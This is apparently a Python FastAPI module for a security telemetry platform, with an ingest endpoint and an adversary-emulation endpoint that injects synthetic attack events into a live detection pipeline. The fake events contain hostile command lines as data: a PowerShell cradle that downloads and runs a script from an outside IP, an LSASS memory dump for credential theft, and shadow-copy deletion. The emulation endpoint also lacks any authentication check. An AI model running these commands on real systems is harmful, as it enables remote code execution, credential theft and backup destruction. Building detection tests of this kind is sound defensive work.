from datetime import datetime, timezone
from typing import Optional
from pydantic import BaseModel
from fastapi import APIRouter, Depends, HTTPException, status, Header
from sqlalchemy.ext.asyncio import AsyncSession
from app.db.session import get_db
from app.core.config import settings
from app.schemas.schemas import TelemetryBatch, TelemetryEvent
from app.services.telemetry_service import telemetry_service
from app.models.models import AuditLog
from app.core.security import generate_audit_hmac

router = APIRouter(prefix="/telemetry", tags=["Telemetry Ingestion"])


class AdversaryEmulationRequest(BaseModel):
    scenario: Optional[str] = "full"
    hostname: Optional[str] = "WS-182"
    ip_address: Optional[str] = "192.168.1.188"
    user_name: Optional[str] = "finance_lead"


@router.post("/ingest")
async def ingest_telemetry(
    batch: TelemetryBatch,
    x_agent_key: str = Header(None),
    db: AsyncSession = Depends(get_db)
):
    # Verify agent key either in header or payload
    provided_key = x_agent_key or batch.agent_key
    if provided_key != settings.AGENT_API_KEY:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Invalid or unauthorized Agent API Key"
        )

    result = await telemetry_service.process_batch(db, batch)
    return result


@router.post("/emulate")
@router.post("/simulate")
async def emulate_attack(
    req: Optional[AdversaryEmulationRequest] = None,
    db: AsyncSession = Depends(get_db)
):
    """
    Cyber Digital Twin & Autonomous Red Team Adversary Simulation.
    Injects deterministic multi-stage attack telemetry into the live detection pipeline:
    1. Obfuscated PowerShell execution cradle (T1059.001)
    2. Outbound Cobalt Strike C2 beaconing (T1071.001)
    3. LSASS memory dump attempt (T1003.001)
    4. Ransomware volume shadow copy destruction (T1490 & T1562.001)
    """
    if req is None:
        req = AdversaryEmulationRequest()

    host = req.hostname or "WS-182"
    ip = req.ip_address or "192.168.1.188"
    user = req.user_name or "finance_lead"

    events = [
        TelemetryEvent(
            event_id_code=1,
            event_source="sysmon",
            host_name=host,
            host_ip=ip,
            process_id=4820,
            process_name="powershell.exe",
            process_command_line="powershell.exe -NoP -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')",
            parent_process_name="explorer.exe",
            user_name=user,
            process_hash_sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        ),
        TelemetryEvent(
            event_id_code=3,
            event_source="sysmon",
            host_name=host,
            host_ip=ip,
            process_id=4820,
            process_name="powershell.exe",
            dst_ip="185.220.101.5",
            dst_port=443,
            user_name=user,
            raw_payload={"bytes_out": 4210, "jitter": "15%", "proto": "TCP"}
        ),
        TelemetryEvent(
            event_id_code=1,
            event_source="sysmon",
            host_name=host,
            host_ip=ip,
            process_id=5192,
            process_name="procdump64.exe",
            process_command_line="procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
            parent_process_name="powershell.exe",
            user_name="SYSTEM",
            process_hash_sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        ),
        TelemetryEvent(
            event_id_code=1,
            event_source="sysmon",
            host_name=host,
            host_ip=ip,
            process_id=6124,
            process_name="vssadmin.exe",
            process_command_line="vssadmin.exe delete shadows /all /quiet",
            parent_process_name="cmd.exe",
            user_name="SYSTEM"
        )
    ]

    batch = TelemetryBatch(
        agent_key=settings.AGENT_API_KEY,
        hostname=host,
        ip_address=ip,
        os_name="Windows",
        os_version="11 Enterprise (23H2)",
        device_type="Workstation",
        cpu_usage=88.5,
        memory_usage=82.0,
        disk_usage=74.0,
        network_rx_mb=34.5,
        network_tx_mb=12.8,
        agent_version=settings.VERSION,
        events=events
    )

    result = await telemetry_service.process_batch(db, batch)

    # Commit audit record
    signed_token = generate_audit_hmac(
        actor="RED_TEAM_SIMULATOR",
        action="ADVERSARY_ATTACK_EMULATION",
        resource_type="TELEMETRY_PIPELINE",
        resource_id=host
    )

    audit_log = AuditLog(
        actor="SKYNET Adversary Simulator",
        action="ADVERSARY_ATTACK_EMULATION",
        resource_type="SIMULATION",
        resource_id=host,
        hmac_signature=signed_token,
        workflow_id="WF-032",
        old_value="BASELINE",
        new_value="ATTACK_INJECTED",
        result="SUCCESS",
        payload={
            "scenario": req.scenario,
            "events_count": len(events),
            "alerts_generated": result.get("alerts_generated", 0),
            "incidents_affected": result.get("incidents_affected", 0),
            "signed_token": signed_token
        },
        client_ip="127.0.0.1"
    )
    db.add(audit_log)
    await db.commit()

    result["scenario"] = req.scenario
    result["signed_token"] = signed_token
    result["message"] = f"Multi-stage intrusion scenario '{req.scenario}' successfully injected into live detection grid."
    return result
